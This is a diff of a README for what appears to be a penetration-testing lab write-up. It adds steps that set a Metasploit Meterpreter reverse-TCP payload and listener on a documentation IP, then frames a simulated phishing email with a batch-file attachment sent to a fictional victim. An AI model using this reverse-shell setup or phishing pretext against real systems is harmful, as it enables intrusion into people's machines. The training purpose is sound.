@@ -20,11 +20,15 @@ Next, I changed the MSF prompt to a handler for reverse shell payloads with the 
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8291d92-cd56-40f7-b7ee-794163bd0e35)
 
-Below, I used the commands "set payload windows/x64/meterpreter/reverse_tcp" and "set LHOST 203.0.113.66" to update the configurations to reflect the payload I will utilize and the host. I re-entered the "show options" command to reveal the updates I made.
+Below, I used the commands "set payload windows/x64/meterpreter/reverse_tcp" and "set LHOST 203.0.113.66" to update the configurations to reflect the payload I will utilize and the host. I re-entered the "show options" command to reveal the updates I made. Once the correct configuration was input, I initiated the MSFConsole as the listener by entering "run". The MSFConsole is now listening on the host 203.0.113.66 on port 4444 for any connections.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/cc92f829-fd31-40ea-b41c-9d433a6a10aa)
 
 **<p style="font-size: 15px;">Step 3: Socially engineer the victim.</p>**
+
+To save time, this lab assumes that I have already crafted and sent a social engineering message to jaime@structureality.com with a batch file attachment, using the Social Engineering Toolkit (SET) as demonstrated in a previous lab. Later on I will create the batch file. 
+
+In this step, I will operate as Jaime, the victim, who has been fooled by a social engineering email. The email had the following statement:
 
 Dear Customer,
 
